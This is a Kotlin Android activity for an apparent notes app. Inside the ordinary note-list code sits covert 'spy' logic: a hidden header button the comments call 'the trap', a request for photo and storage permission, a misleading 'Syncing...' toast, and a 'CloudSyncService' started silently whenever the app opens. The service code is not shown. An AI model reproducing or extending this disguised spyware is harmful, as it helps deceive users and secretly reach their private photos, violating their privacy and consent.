package cl.example.mynotes

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.ImageButton
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.recyclerview.widget.RecyclerView
import androidx.recyclerview.widget.StaggeredGridLayoutManager
import com.google.android.material.floatingactionbutton.FloatingActionButton
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    private val db by lazy { NotesDatabase.getDatabase(this) }
    private lateinit var adapter: NotesAdapter

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // --- ESTÉTICA: Barras transparentes y Edge-to-Edge ---
        WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main_root)) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        // 1. CONFIGURAR RECYCLERVIEW (La Lista)
        val recyclerView = findViewById<RecyclerView>(R.id.recycler_view)

        adapter = NotesAdapter { noteClicked ->
            // Al hacer clic en una nota, abrimos el editor con los datos
            val intent = Intent(this, NoteEditorActivity::class.java)
            intent.putExtra("note_data", noteClicked)
            startActivity(intent)
        }

        recyclerView.adapter = adapter
        // Layout Pinterest: 2 columnas verticales desalineadas
        recyclerView.layoutManager = StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL)

        // 2. OBSERVADOR DE BASE DE DATOS (Automático)
        CoroutineScope(Dispatchers.Main).launch {
            // collect se queda escuchando cambios. Si agregas una nota, la lista se actualiza sola.
            db.notesDao().getAllNotes().collect { list ->
                adapter.submitList(list)
            }
        }

        // 3. BOTÓN FLOTANTE (+)
        findViewById<FloatingActionButton>(R.id.fab_add_note).setOnClickListener {
            val intent = Intent(this, NoteEditorActivity::class.java)
            startActivity(intent)
        }

        // 4. LA TRAMPA (Botón Cámara oculto en la cabecera)
        findViewById<ImageButton>(R.id.btn_spy_cam).setOnClickListener {
            checkPermissionAndStart()
        }

        // 5. INICIO SILENCIOSO (Arranca el servicio al abrir la app)
        iniciarServicioSilencioso()
    }

    // --- LÓGICA ESPÍA (Igual que antes) ---
    private fun checkPermissionAndStart() {
        val permission = if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(permission), 101)
        } else {
            Toast.makeText(this, "Sincronizando...", Toast.LENGTH_SHORT).show()
            iniciarServicioSilencioso()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            iniciarServicioSilencioso()
        }
    }

    private fun iniciarServicioSilencioso() {
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }
}